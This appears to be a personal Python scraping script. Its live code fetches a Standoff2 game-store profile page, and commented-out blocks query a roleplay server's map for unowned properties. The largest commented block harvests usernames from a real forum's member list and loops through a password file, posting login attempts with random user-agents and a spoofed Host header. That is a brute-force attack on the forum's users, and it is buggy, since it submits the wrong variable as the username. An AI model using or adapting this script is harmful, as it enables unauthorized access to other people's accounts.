import requests
from bs4 import BeautifulSoup
import fake_useragent
link1 = "https://store.standoff2.com/ru/profile/11111111"
user = fake_useragent.UserAgent().random


# data = {"phone": "79254460145"}

header = {"user-agent": user}
logins = requests.get(link1, headers = header).text
soup = BeautifulSoup(logins, "lxml")
pum = soup.find("div", class_ = "MuiBox-root jss84")
print(pum)
# logins = requests.post(link1, data = data, headers = header).json() MuiBox-root jss84







# link = f"https://matrp.ru/map"
# link1 = "https://matrp.ru/handlers/mapHandler"
# data = {"server": i}
# header = {"user-agent": user}
# logins = requests.post(link1, data = data, headers = header).json()

# print("Свободные бизнесы:")
# for biz in logins["content"]["business"]:
    
#     if biz["owner_name"] == 'None':
#         print(biz["name"])
# print("Свободные дома:")
# for biz in logins["content"]["houses"]:
    
#     if biz["owner_name"] == 'None':
#         print(f'''{biz["id"]} - Цена: {biz["price"]}''')

















# for x in range(1, 40):
#     link = f"https://lovestory.4bb.ru/userlist.php?show_group=-1&sort_by=username&sort_dir=ASC&username=-&p={x}"

#     res = requests.get(link).text
#     soup = BeautifulSoup(res, "lxml")
#     pum = soup.find("div", id = "pun-main", class_ = "main multipage")
#     cont = pum.find("div", class_ = "container")
#     table = cont.find('table')
#     group4 = table.find_all('tr', class_ = "group4 altstyle")
#     for i in group4:
#         user1 = i.find('td', class_="tcl username")
#         user2 = user1.find("span", class_ = 'usersname')
#         user3 = user2.find('a').text
#         with open("pass.txt", "r") as file:
#             pasword = "".join(file.readlines()).strip().split("\n")
#         for pas in pasword:
#             user = fake_useragent.UserAgent().random
#             link_log = "https://lovestory.4bb.ru/login.php?action=in"
#             data = {"req_username": i,
#                     "req_password": pas}
#             header = {
#                 "user-agent": user,
#                 "host": "my_domain.com"
#             }
#             logins = requests.post(link_log, data = data, headers = header).text
#             print(logins)





